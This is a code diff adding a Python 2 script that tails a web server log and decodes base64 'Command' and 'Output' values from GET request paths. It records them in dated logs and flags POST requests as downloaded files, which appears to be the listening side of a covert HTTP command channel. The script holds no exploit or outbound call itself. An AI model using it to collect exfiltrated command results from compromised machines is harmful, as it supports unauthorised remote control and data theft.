@@ -1,0 +1,74 @@
+import sys, os
+import re
+import base64
+import time
+import datetime
+
+# Generate Time as Log
+t = time.localtime()
+current_time = time.strftime("%H%M%S", t)
+today = datetime.date.today()
+LOG = str(today)+ '-' + current_time
+#print LOG
+
+
+
+oldInput = ""
+Input = ""
+Results = ""
+
+#execfile('./egui-http.py &>> log.txt')
+
+#os.system('python egui-http.py &>> log.txt')
+
+while True:
+     
+    with open('./ServerRequirements/log.txt', 'r') as f:
+        #info = f.read()
+        #print 'Readed: ' + info
+        lineList = f.readlines() # read lines
+        lastLine = lineList[len(lineList)-1] # read last line
+        #print "Last line is: " + lastLine # prints last line
+            
+        SearchStr = re.search(r'GET (.*?) HTTP', lastLine) # search for string between GET and HTTP.. which should be the base64
+        SearchDL = re.search(r'POST (.*?) HTTP', lastLine)
+
+
+        if SearchStr:
+            #print SearchStr.groups() # prints if true
+            Output = str(SearchStr.groups())
+            
+            try:  
+                Input = base64.b64decode(Output.split("/")[2]) # Made a 2 instead of 1 because of SErverRequirements
+                Results = base64.b64decode(Output.split("/")[3])
+            except IndexError:
+                continue
+            except TypeError:
+                continue
+
+            if Input != oldInput:
+                print "Command: " + Input
+                print "Output: " + Results
+                
+                f = open("./Logs/" + LOG + "-log.txt", "a")
+                f.write(Input + '\n')
+                f.write(Results + '\n')
+                f.write('\n')
+                # TODO: Save to Log
+                #echo "$Input" >> LOG
+                #echo "$Results" >> LOG
+                #echo "" >> $LOG
+                
+    
+        elif SearchDL:
+            #print SearchDL.groups()
+            Output = str(SearchDL.groups())
+            Input = str(SearchDL.groups())
+
+            if Input != oldInput:
+                print "File Downloaded"
+
+
+    oldInput = Input
+    oldResults = Results
+    time.sleep(5)
